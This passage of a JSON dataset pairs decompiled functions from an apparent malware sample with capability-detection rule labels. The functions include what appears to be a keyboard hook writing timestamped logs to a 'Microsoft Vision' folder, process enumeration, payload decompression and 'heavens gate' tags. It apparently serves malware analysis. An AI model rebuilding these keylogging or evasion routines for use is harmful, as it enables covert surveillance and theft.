arg_8h = fcn.0040460a(&var_258h);\n            fcn.004043c7(arg_8h);\n            fcn.00406f1d();\n            iVar1 = var_24h;\n            var_8h = iVar3;\n            if (var_24h != 0) {\n                (*_sym.imp.KERNEL32.dll_lstrlenW)(var_24h);\n                iVar3 = fcn.00406f2c();\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(iVar3, iVar1);\n            }\n            fcn.00401abc(iVar3, in_stack_fffffd44, var_1ch, var_18h, var_14h);\n            fcn.00406f1d();\n            iVar3 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(iVar2, &lpFindFileData);\n            in_ECX = var_ch;\n        } while (iVar3 != 0);\n    }\n    fcn.0040153f(&var_34h);\n    fcn.00401586();\n    fcn.00406f1d();\n    return in_ECX;\n}\n",
        "token_count": 604
    },
    "00413f4f": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00413f4f(uint dwDesiredAccess)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t in_ECX;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateFileW)(*(in_ECX + 4), dwDesiredAccess, 1, 0, 3, 0, 0);\n    *(in_ECX + 8) = iVar1;\n    if (iVar1 == -1) {\n        *(in_ECX + 8) = 0;\n    }\n    else {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetFileSize)(iVar1, 0);\n        *(in_ECX + 0x14) = uVar2;\n    }\n    return iVar1 != -1;\n}\n",
        "token_count": 175
    },
    "00413f8e": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool __fastcall fcn.00413f8e(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateFileW)(*(param_1 + 4), 0x40000000, 1, 0, 2, 0, 0);\n    *(param_1 + 8) = iVar1;\n    if (iVar1 == -1) {\n        *(param_1 + 8) = 0;\n    }\n    return iVar1 != -1;\n}\n",
        "token_count": 121
    },
    "00414070": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00414070(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateMutexA)(0, 0, 0);\n    *param_1 = iVar1;\n    param_1[1] = iVar1 != -1;\n    return param_1;\n}\n",
        "token_count": 84
    },
    "00414a4a": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00414a4a(uint *param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_22ch;\n    int32_t var_224h;\n    uint var_208h;\n    \n    var_22ch = 0x22c;\n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateToolhelp32Snapshot)(2, 0);\n    if (iVar1 != -1) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_Process32FirstW)(iVar1, &var_22ch);\n        while (iVar2 != 0) {\n            if (var_224h == param_2) {\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n                fcn.0040460a(&var_208h);\n                return param_1;\n            }\n            iVar2 = (*_sym.imp.KERNEL32.dll_Process32NextW)(iVar1, &var_22ch);\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n    }\n    *param_1 = 0;\n    return param_1;\n}\n",
        "token_count": 257
    },
    "00415c81": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00415c81(uint nNumberOfBytesToWrite)\n\n{\n    int32_t iVar1;\n    uint lpNumberOfBytesWritten;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateFileA)();\n    if (iVar1 != -1) {\n        (*_sym.imp.KERNEL32.dll_WriteFile)(iVar1);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n    }\n    return;\n}\n",
        "token_count": 96
    },
    "00415d7c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00415d7c(uint nNumberOfBytesToWrite)\n\n{\n    int32_t iVar1;\n    uint lpNumberOfBytesWritten;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateFileW)();\n    if (iVar1 != -1) {\n        (*_sym.imp.KERNEL32.dll_WriteFile)(iVar1);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n    }\n    return;\n}\n",
        "token_count": 97
    },
    "00415e27": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00415e27(uint param_1, uint *param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint lpNumberOfBytesRead;\n    \n    lpNumberOfBytesRead = param_1;\n    uVar1 = fcn.00401000(0x2800000);\n    lpNumberOfBytesRead = 0;\n    iVar2 = (*_sym.imp.KERNEL32.dll_CreateFileA)(param_1, 0x80000000, 0, 0, 3, 0x80, 0);\n    if (iVar2 == -1) {\n        *param_2 = 0;\n    }\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetFileSize)(iVar2, 0);\n    *param_2 = uVar3;\n    iVar4 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar2, uVar1, uVar3, &lpNumberOfBytesRead, 0);\n    if (iVar4 == 0) {\n        *param_2 = 0;\n    }\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    return uVar1;\n}\n",
        "token_count": 269
    },
    "004056a4": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004056a4(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint32_t arg_ch;\n    uint uStack96;\n    uchar auStack92 [4];\n    uchar auStack88 [4];\n    uchar auStack84 [52];\n    uint uStack32;\n    uint uStack28;\n    uchar auStack24 [16];\n    \n    uStack28 = 0;\n    uStack32 = 0x11;\n    arg_ch = 0;\n    auStack24 = ZEXT816(0);\n    if (*(in_ECX + 0xc) != 0) {\n        do {\n            arg_8h_00 = fcn.00401766(&uStack96, arg_ch);\n            fcn.00404788(arg_8h_00);\n            fcn.00406f1d();\n            iVar1 = fcn.00401766(auStack92, arg_ch);\n            fcn.00404767(*(iVar1 + 4));\n            fcn.00406f1d();\n            iVar1 = fcn.00401766(auStack88, arg_ch);\n            fcn.00404767(*(iVar1 + 8));\n            fcn.00406f1d();\n            iVar1 = fcn.00401766(auStack84, arg_ch);\n            fcn.00404767(*(iVar1 + 0xc));\n            fcn.00406f1d();\n            uStack96 = 0;\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < *(in_ECX + 0xc));\n    }\n    fcn.004046da(arg_8h);\n    fcn.004046c6();\n    return arg_8h;\n}\n",
        "token_count": 393
    },
    "0040ab70": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint fcn.0040ab70(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint extraout_ECX;\n    uint32_t uStack292;\n    uint32_t uStack288;\n    uint32_t uStack284;\n    uint32_t uStack276;\n    uchar *puStack272;\n    uchar *puStack268;\n    int32_t iStack264;\n    char16_t *pcStack260;\n    uint uStack256;\n    uint uStack252;\n    uint32_t uStack248;\n    uint32_t uStack244;\n    uint32_t uStack240;\n    uint32_t uStack236;\n    uint uStack204;\n    \n    uStack236 = 0;\n    uStack240 = 0x40ab87;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n    iVar4 = *0x41e6a0;\n    uStack240 = 0x800;\n    uStack204 = 0;\n    uStack248 = *0x41e6a0 + 0x210;\n    uStack244 = 0;\n    uStack252 = 0x40abad;\n    fcn.00401293();\n    uStack240 = 0x208;\n    uStack244 = 0;\n    uStack252 = 0x40abbf;\n    uStack248 = iVar4 + 0x10U;\n    fcn.00401293();\n    uStack244 = 0;\n    uStack248 = 0;\n    uStack252 = 0x1c;\n    uStack256 = 0;\n    pcStack260 = 0x40abce;\n    uStack240 = iVar4 + 0x10U;\n    (*_sym.imp.SHELL32.dll_SHGetFolderPathW)();\n    pcVar1 = _sym.imp.KERNEL32.dll_lstrcatW;\n    iStack264 = *0x41e6a0 + 0x10;\n    pcStack260 = L\"\\\\Microsoft Vision\\\\\";\n    puStack268 = 0x40abe4;\n    (*_sym.imp.KERNEL32.dll_lstrcatW)();\n    puStack268 = &stack0xffffff0c;\n    puStack272 = 0x40abef;\n    (*_sym.imp.KERNEL32.dll_GetLocalTime)();\n    puStack272 = uStack236 & 0xffff;\n    uStack276 = uStack240 >> 0x10;\n    uStack284 = uStack248 & 0xffff;\n    uStack288 = uStack248 >> 0x10;\n    uStack292 = uStack244 >> 0x10;\n    (*_sym.imp.USER32.dll_wsprintfW)(&stack0xffffff34, L\"%02d-%02d-%02d_%02d.%02d.%02d\");\n    puStack272 = &stack0xffffff34;\n    uStack276 = *0x41e6a0 + 0x10;\n    (*pcVar1)();\n    uStack284 = 0x40ac48;\n    fcn.0040428f(*0x41e6a0 + 0x10);\n    uStack284 = 0;\n    uStack288 = 0x80;\n    uStack292 = 2;\n    uVar3 = (*_sym.imp.KERNEL32.dll_CreateFileW)(*(*0x41e6a0 + 0xc), 0x10000000, 1, 0);\n    *(*0x41e6a0 + 4) = uVar3;\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n    fcn.00415e27();\n    iVar4 = fcn.004147a3();\n    if (iVar4 != 0) {\n        *0x41e69c = fcn.0041473a(extraout_ECX);\n    }\n    (**0x41e69c)(0xd, fcn.0040acf4, uVar2, 0);\n    pcVar1 = _sym.imp.USER32.dll_GetMessageA;\n    while (iVar4 = (*pcVar1)(&stack0xfffffeec, 0, 0, 0),  0 < iVar4) {\n        (*_sym.imp.USER32.dll_TranslateMessage)(&stack0xfffffedc);\n        (*_sym.imp.USER32.dll_DispatchMessageA)(&stack0xfffffef0);\n    }\n    return 0;\n}\n",
        "token_count": 969
    },
    "004173be": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004173be(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint32_t arg_ch;\n    uchar auStack96 [4];\n    uchar auStack92 [4];\n    uchar auStack88 [4];\n    uchar auStack84 [52];\n    uint uStack32;\n    uint uStack28;\n    uchar auStack24 [16];\n    \n    uStack32 = 0x19;\n    arg_ch = 0;\n    uStack28 = 0;\n    auStack24 = ZEXT816(0);\n    if (*(in_ECX + 0xc) != 0) {\n        do {\n            arg_8h_00 = fcn.00402a03(auStack96, arg_ch);\n            fcn.00404788(arg_8h_00);\n            fcn.004015d4();\n            iVar1 = fcn.00402a03(auStack92, arg_ch);\n            fcn.00404788(iVar1 + 4);\n            fcn.004015d4();\n            iVar1 = fcn.00402a03(auStack88, arg_ch);\n            fcn.00404788(iVar1 + 8);\n            fcn.004015d4();\n            iVar1 = fcn.00402a03(auStack84, arg_ch);\n            fcn.00404767(*(iVar1 + 0xc));\n            fcn.004015d4();\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < *(in_ECX + 0xc));\n    }\n    fcn.004046da(arg_8h);\n    fcn.004046c6();\n    return arg_8h;\n}\n",
        "token_count": 386
    },
    "0041780e": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0041780e(uint *arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    int32_t in_ECX;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    uint extraout_ECX_02;\n    uint extraout_ECX_03;\n    uint extraout_ECX_04;\n    uint var_ch;\n    uint var_8h;\n    \n    if (arg_10h == 0) {\n        if (*(in_ECX + 0x18) == 0) {\n            var_8h = 0;\n            var_ch = 0x4197cc;\n            fcn.00405f32(&var_ch);\n            fcn.00413ada(extraout_ECX_04);\n        }\n    }\n    else if (arg_10h == 1) {\n        if (*(in_ECX + 0x34) == 0) {\n            var_ch = 0x4197cc;\n            var_8h = 1;\n            fcn.00405f32(&var_ch);\n            fcn.00413ada(extraout_ECX_03);\n        }\n        in_ECX = in_ECX + 0x1c;\n    }\n    else if (arg_10h == 2) {\n        if (*(in_ECX + 0x50) == 0) {\n            var_ch = 0x4197cc;\n            var_8h = 2;\n            fcn.00405f32(&var_ch);\n            fcn.00413ada(extraout_ECX_02);\n        }\n        in_ECX = in_ECX + 0x38;\n    }\n    else if (arg_10h == 3) {\n        if (*(in_ECX + 0x6c) == 0) {\n            var_ch = 0x4197cc;\n            var_8h = 3;\n            fcn.00405f32(&var_ch);\n            fcn.00413ada(extraout_ECX_01);\n        }\n        in_ECX = in_ECX + 0x54;\n    }\n    else if (arg_10h == 4) {\n        if (*(in_ECX + 0x88) == 0) {\n            var_ch = 0x4197cc;\n            var_8h = 4;\n            fcn.00405f32(&var_ch);\n            fcn.00413ada(extraout_ECX_00);\n        }\n        in_ECX = in_ECX + 0x70;\n    }\n    else {\n        if (arg_10h != 5) {\n            *arg_8h = 0;\n            arg_8h[1] = 0;\n            return arg_8h;\n        }\n        if (*(in_ECX + 0xa4) == 0) {\n            var_ch = 0x4197cc;\n            var_8h = 5;\n            fcn.00405f32(&var_ch);\n            fcn.00413ada(extraout_ECX);\n        }\n        in_ECX = in_ECX + 0x8c;\n    }\n    fcn.00404094(in_ECX);\n    return arg_8h;\n}\n",
        "token_count": 707
    },
    "00406aa8": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa"
        ],
        "decompiled_code": "\nvoid fcn.00406aa8(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_90h;\n    uint var_44h;\n    uint var_1ch;\n    int32_t *var_14h;\n    uint var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    (*_sym.imp.KERNEL32.dll_Sleep)(500);\n    fcn.00414227();\n    uVar1 = fcn.00415c0e();\n    fcn.0041411e(uVar1);\n    uVar1 = fcn.0040434f(0x41990c);\n    fcn.00414091(&var_44h, uVar1);\n    fcn.00406f1d();\n    fcn.00404094(&var_1ch);\n    fcn.00403eca(&var_ch);\n    fcn.00404081();\n    fcn.004069f6(&var_14h);\n    iVar3 = *var_14h;\n    uVar1 = fcn.00415dc4(iVar3);\n    fcn.004043c7(uVar1);\n    fcn.00406f1d();\n    var_4h[5] = *(var_14h + iVar3 + 4);\n    iVar2 = *(var_14h + iVar3 + 8);\n    uVar1 = fcn.00415dc4(iVar2);\n    fcn.004043c7(uVar1);\n    fcn.00406f1d();\n    iVar2 = iVar3 + 0xc + iVar2;\n    var_4h[7] = *(var_14h + iVar2);\n    iVar3 = *(var_14h + iVar2 + 4);\n    uVar1 = fcn.00415dc4(iVar3);\n    fcn.004043c7(uVar1);\n    fcn.00406f1d();\n    iVar3 = iVar2 + 8 + iVar3;\n    var_4h[8] = *(var_14h + iVar3);\n    iVar2 = *(var_14h + iVar3 + 1);\n    uVar1 = fcn.00415dc4(iVar2);\n    fcn.004043c7(uVar1);\n    fcn.00406f1d();\n    iVar2 = iVar3 + 5 + iVar2;\n    var_4h[10] = *(var_14h + iVar2);\n    iVar3 = *(var_14h + iVar2 + 1);\n    uVar1 = fcn.00415dc4(iVar3);\n    fcn.004043c7(uVar1);\n    fcn.00406f1d();\n    iVar3 = iVar2 + 5 + iVar3;\n    var_4h[0xd] = *(var_14h + iVar3);\n    var_4h[0xf] = *(var_14h + iVar3 + 4);\n    var_4h[0x10] = *(var_14h + iVar3 + 5);\n    var_4h[0x11] = *(var_14h + iVar3 + 6);\n    var_4h[0x12] = *(var_14h + iVar3 + 7);\n    var_4h[0x13] = *(var_14h + iVar3 + 8);\n    fcn.00415dc4(*(var_14h + iVar3 + 9));\n    fcn.004043c7(&var_4h);\n    *var_4h = 1;\n    var_4h[1] = 1;\n    fcn.00406f1d();\n    fcn.00404081();\n    fcn.00404081();\n    fcn.00402453();\n    return;\n}\n",
        "token_count": 843
    },
    "00409eee": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00409eee(void)\n\n{\n    int64_t iVar1;\n    uint var_a8h;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    iVar1 = fcn.0040a2ab();\n    if (iVar1 != 0) {\n        return iVar1;\n    }\n    return 0;\n}\n",
        "token_count": 95
    },
    "0040a59d": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040a59d(void)\n\n{\n    uint var_8h;\n    \n    return;\n}\n",
        "token_count": 25
    },
    "0040a5db": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __cdecl fcn.0040a5db(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    if ((arg_8h == 0) && (arg_ch == 0)) {\n        return 0;\n    }\n    return arg_ch;\n}\n",
        "token_count": 112
    },
    "0040a699": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040a699(void)\n\n{\n    return;\n}\n",
        "token_count": 16
    },
    "00407384": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nbool __fastcall fcn.00407384(int32_t param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    uVar2 = param_2 & 0x8000001f;\n    if (uVar2 < 0) {\n        uVar2 = (uVar2 - 1 | 0xffffffe0) + 1;\n    }\n    uVar1 = 1;\n    if (0 < uVar2) {\n        do {\n            uVar1 = uVar1 * 2;\n            uVar2 = uVar2 - 1;\n        } while (uVar2 != 0);\n    }\n    return (uVar1 & *(*(param_1 + 0xc) + (param_2 + (param_2 >> 0x1f & 0x1fU) >> 5) * 4)) != 0;\n}\n",
        "token_count": 207
    },
    "004076c6": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004076c6(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_EDX;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = 0;\n    fcn.00401293(arg_8h, 0, 0x80);\n    iVar4 = 0;\n    if (0 < *(in_EDX + 4)) {\n        puVar2 = *(in_EDX + 0xc);\n        do {\n            iVar1 = 0;\n            do {\n                *(iVar3 + arg_8h) = (0xff << (iVar1 & 0x1f) & *puVar2) >> (iVar1 & 0x1f);\n                iVar3 = iVar3 + 1;\n                if (0x80 < iVar3) goto code_r0x00407729;\n                iVar1 = iVar1 + 8;\n            } while (iVar1 < 0x20);\n            iVar4 = iVar4 + 1;\n            puVar2 = puVar2 + 1;\n        } while (iVar4 < *(in_EDX + 4));\n    }\ncode_r0x00407729:\n    fcn.00407d69();\n    return;\n}\n",
        "token_count": 301
    },
    "00407e70": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00407e70(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h, uint32_t *arg_14h)\n\n{\n    int32_t arg_1ch;\n    int32_t iVar1;\n    uint8_t *in_ECX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t in_EDX;\n    uint arg_8h_00;\n    uint var_bch;\n    int32_t var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    uint32_t var_30h;\n    uint32_t var_2ch;\n    int32_t var_28h;\n    uint32_t var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    \n    *arg_14h = 0;\n    var_14h = 0;\n    uVar2 = *(in_ECX + 4) << 8;\n    uVar3 = (uVar2 | in_ECX[3]) << 8;\n    uVar4 = (uVar3 | in_ECX[2]) << 8;\n    var_24h = (((*(in_ECX + 4) >> 0x18) << 8 | uVar2 >> 0x18) << 8 | uVar3 >> 0x18) << 8 | uVar4 >> 0x18;\n    var_20h = (uVar4 | in_ECX[1]) << 8 | *in_ECX;\n    uVar2 = 8;\n    var_10h = 8;\n    if ((var_24h == 0) && (var_20h <= arg_10h)) {\n        _var_1ch = 0;\n        var_8h = in_EDX;\n        arg_1ch = fcn.00407e36();\n        if ((arg_1ch != 0) && (var_3ch = arg_1ch,  var_34h = fcn.00407738(*(arg_8h + 0x404)),  var_34h != 0)) {\n            arg_8h_00 = *(arg_8h + 0x200);\n            iVar1 = fcn.00407738(arg_8h_00);\n            if (iVar1 != 0) {\n                fcn.00407641(arg_8h_00);\n                if (8 < var_8h) {\n                    arg_10h = var_18h;\n                    var_2ch = var_1ch;\n                    do {\n                        uVar3 = var_2ch;\n                        if ((var_14h + (0xffffff7f < uVar2) == 0) && (uVar2 + 0x80 < var_8h)) {\n                            var_30h = 0x80;\n                            uVar2 = 0;\n                        }\n                        else {\n                            var_30h = var_8h - uVar2;\n                            uVar2 = -(var_8h < uVar2) - var_14h;\n                        }\n                        _var_1ch = _var_1ch & 0xffffffff | uVar2 << 0x20;\n                        uVar4 = var_2ch + 0x75;\n                        uVar2 = arg_10h + (0xffffff8a < var_2ch);\n                        if ((var_24h < uVar2) || ((var_24h <= uVar2 && (var_20h <= uVar4)))) {\n                            uVar2 = var_20h - var_2ch;\n                            var_ch = (var_24h - arg_10h) - (var_20h < var_2ch);\n                        }\n                        else {\n                            uVar2 = 0x75;\n                            var_ch = 0;\n                        }\n                        var_28h = 0;\n                        uVar4 = fcn.004080d0(uVar4, &var_bch, uVar4, &var_28h, uVar4, arg_1ch, var_34h);\n                        iVar1 = var_ch;\n                        if (uVar4 != 0) {\n                            return uVar4;\n                        }\n                        if (var_28h != 0x75) {\n                            return 3;\n                        }\n                        if ((var_ch != 0) || (uVar2 != 0)) {\n                            var_ch = arg_ch + uVar3;\n                            do {\n                                do {\n                                    *(var_ch + uVar4) = *(&var_bch + uVar4);\n                                    uVar4 = uVar4 + 1;\n                                } while (iVar1 != 0);\n                            } while (uVar4 < uVar2);\n                            uVar4 = 0;\n                            arg_1ch = var_3ch;\n                            uVar3 = var_2ch;\n                        }\n                        var_1ch = uVar3 + uVar2;\n                        arg_10h = arg_10h + iVar1 + CARRY4(uVar3, uVar2);\n                        uVar2 = var_10h + var_30h;\n                        var_14h = var_14h + var_18h + CARRY4(var_10h, var_30h);\n                        var_2ch = var_1ch;\n                        var_10h = uVar2;\n                    } while ((var_14h < uVar4) || ((var_14h <= uVar4 && (uVar2 < var_8h))));\n                }\n                fcn.00407607();\n                fcn.00407d69();\n                fcn.00407e03();\n                *arg_14h = var_1ch;\n                return 0;\n            }\n        }\n    }\n    return 1;\n}\n",
        "token_count": 1329
    },
    "0040c475": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040c475(int32_t param_1)\n\n{\n    char cVar1;\n    char cVar2;\n    char cVar3;\n    char cVar4;\n    char *arg_8h;\n    uint uVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint *puVar8;\n    uint *puVar9;\n    uint var_4a0h;\n    uint var_2a0h;\n    uint var_29ch;\n    uint var_9ch;\n    uint var_98h;\n    uint uStack152;\n    uint uStack148;\n    uint uStack144;\n    uint var_88h;\n    uint uStack136;\n    uint uStack132;\n    uint uStack128;\n    uint var_78h;\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    uint var_68h;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint var_58h;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint var_48h;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint var_38h;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint var_28h;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = param_1;\n    fcn.00401293(&var_4a0h, 0, 0x408);\n    var_98h = *0x41ca10;\n    uStack152 = *0x41ca14;\n    uStack148 = *0x41ca18;\n    uStack144 = *0x41ca1c;\n    var_4h = 0;\n    var_88h = *0x41ca40;\n    uStack136 = *0x41ca44;\n    uStack132 = *0x41ca48;\n    uStack128 = *0x41ca4c;\n    var_2a0h = 0x80;\n    var_78h = *0x41ca20;\n    uStack120 = *0x41ca24;\n    uStack116 = *0x41ca28;\n    uStack112 = *0x41ca2c;\n    var_68h = *0x41ca70;\n    uStack104 = *0x41ca74;\n    uStack100 = *0x41ca78;\n    uStack96 = *0x41ca7c;\n    var_58h = *0x41ca60;\n    uStack88 = *0x41ca64;\n    uStack84 = *0x41ca68;\n    uStack80 = *0x41ca6c;\n    var_9ch = 3;\n    var_48h = *0x41ca80;\n    uStack72 = *0x41ca84;\n    uStack68 = *0x41ca88;\n    uStack64 = *0x41ca8c;\n    var_38h = *0x41ca30;\n    uStack56 = *0x41ca34;\n    uStack52 = *0x41ca38;\n    uStack48 = str.gqw:1._0_4_;\n    var_28h = *0x41ca50;\n    uStack40 = *0x41ca54;\n    uStack36 = *0x41ca58;\n    uStack32 = *0x41ca5c;\n    puVar8 = &var_98h;\n    puVar9 = &var_4a0h;\n    for (iVar7 = 0x20; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar9 = *puVar8;\n        puVar8 = puVar8 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    uVar5 = *(param_1 + 0x28);\n    arg_8h = *(param_1 + 0x24);\n    var_29ch._0_2_ = 1;\n    var_29ch._2_1_ = 1;\n    var_8h = uVar5;\n    _var_18h = fcn.0040820b();\n    fcn.00410170(arg_8h, uVar5);\n    cVar1 = arg_8h[3];\n    cVar2 = arg_8h[2];\n    cVar3 = arg_8h[1];\n    cVar4 = *arg_8h;\n    uVar5 = fcn.00401000(uVar5);\n    fcn.00407e70(&var_4a0h, uVar5, ((cVar1 << 8 | cVar2) << 8 | cVar3) << 8 | cVar4, &var_4h);\n    uVar6 = fcn.004147a3();\n    iVar7 = var_ch;\n    *(var_ch + 0x20) = uVar6;\n    fcn.00401014(uVar5);\n    if (*(iVar7 + 0x20) != 0) {\n        uVar5 = fcn.0041473a(*(iVar7 + 0x20));\n        *(iVar7 + 0x40) = uVar5;\n        *0x41e8bc = fcn.0041473a();\n        uVar5 = fcn.0041473a();\n        *(iVar7 + 0x44) = uVar5;\n        uVar5 = fcn.0041473a();\n        *(iVar7 + 0x4c) = uVar5;\n        uVar5 = fcn.0041473a();\n        *(iVar7 + 0x50) = uVar5;\n        uVar5 = fcn.0041473a();\n        *(iVar7 + 0x54) = uVar5;\n        uVar5 = fcn.0041473a();\n        *(iVar7 + 0x58) = uVar5;\n        uVar5 = fcn.0041473a();\n        *(iVar7 + 0x5c) = uVar5;\n        uVar5 = fcn.0041473a();\n        *(iVar7 + 0x60) = uVar5;\n        uVar5 = fcn.0041473a();\n        *(iVar7 + 0x48) = uVar5;\n        uVar5 = fcn.0041473a();\n        *(iVar7 + 0x3c) = uVar5;\n        uVar5 = fcn.0041473a();\n        *(iVar7 + 0x70) = uVar5;\n        uVar5 = fcn.0041473a();\n        *(iVar7 + 0x74) = uVar5;\n        uVar5 = fcn.0041473a();\n        *(iVar7 + 0x78) = uVar5;\n        uVar5 = fcn.0041473a();\n        *(iVar7 + 0x80) = uVar5;\n        uVar5 = fcn.0041473a();\n        *(iVar7 + 0x7c) = uVar5;\n        if ((((*(iVar7 + 0x40) != 0) && (*0x41e8bc != 0)) && (*(iVar7 + 0x44) != 0)) &&\n           ((*(iVar7 + 0x4c) != 0 && (*(iVar7 + 0x60) != 0)))) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 1729
    },
    "00417e48": {
        "rules": [
